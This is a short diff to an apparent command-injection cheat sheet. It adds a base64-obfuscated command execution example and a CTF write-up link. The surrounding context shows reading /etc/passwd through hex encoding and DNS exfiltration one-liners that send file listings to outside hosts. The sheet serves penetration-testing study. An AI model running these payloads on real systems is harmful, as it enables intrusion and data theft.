@@ -137,6 +137,10 @@ swissky@crashlab▸ ~ ▸ $ xxd -r -ps <(echo 2f6574632f706173737764)
 
 swissky@crashlab▸ ~ ▸ $ cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 root:x:0:0:root:/root:/bin/bash
+
+swissky@crashlab▸ ~ ▸ $ `echo d2hvYW1pCg==|base64 -d`
+sswissky
+
 ```
 
 ### Bypass characters filter
@@ -246,10 +250,14 @@ for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 $(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
 ```
 
+
 Online tools to check for DNS based data exfiltration:
 
 - dnsbin.zhack.ca
 - pingb.in
+
+
+Ex: https://nullarmor.github.io/posts/cybrics-gif2png
 
 ## Polyglot command injection
 
